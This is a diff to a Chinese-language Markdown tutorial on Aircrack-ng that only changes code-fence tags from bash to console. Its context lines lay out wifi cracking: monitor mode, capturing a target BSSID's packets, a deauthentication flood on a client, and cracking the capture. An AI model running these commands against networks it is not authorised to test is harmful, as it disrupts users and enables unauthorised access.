@@ -32,7 +32,7 @@ _Aircrack-ng_ 是一个分析 _IEEE 802.11_ 标准网络的安全软件
 
 ### 插入无线网卡并查看是否被 _OS_ 识别
 
-```bash
+```console
 $ ifconfig
 ```
 
@@ -42,7 +42,7 @@ $ ifconfig
 
 ### 将网卡设置为监控模式
 
-```bash
+```console
 $ airmon-ng start wlan0
 ```
 
@@ -50,7 +50,7 @@ $ airmon-ng start wlan0
 
 ### 查看网卡是否已进入监控模式
 
-```bash
+```console
 $ ifconfig
 ```
 
@@ -60,7 +60,7 @@ $ ifconfig
 
 ### 使用网卡监控空间内的无线网络通信状态
 
-```bash
+```console
 $ airodump-ng wlan0mon
 ```
 
@@ -70,7 +70,7 @@ $ airodump-ng wlan0mon
 
 ### 抓取攻击目标的数据包
 
-```bash
+```console
 $ airodump-ng -w test -c 11 --bssid 00:6B:8E:5E:7E:E8 wlan0mon
 ```
 
@@ -93,7 +93,7 @@ $ airodump-ng -w test -c 11 --bssid 00:6B:8E:5E:7E:E8 wlan0mon
 
 可以对连接到该 _AP_ 的客户端使用 __洪泛解除认证攻击__，迫使客户端发送重新连接的数据包，从而获得更多数据包
 
-```bash
+```console
 $ aireplay-ng -0 10 -a 00:6B:8E:5E:7E:E8 -c B8:C1:11:02:B7:05 wlan0mon
 ```
 
@@ -110,7 +110,7 @@ $ aireplay-ng -0 10 -a 00:6B:8E:5E:7E:E8 -c B8:C1:11:02:B7:05 wlan0mon
 
 ### 利用抓取到的数据包进行破解
 
-```bash
+```console
 $ aircrack-ng -a 1 test-01.cap
 ```
 
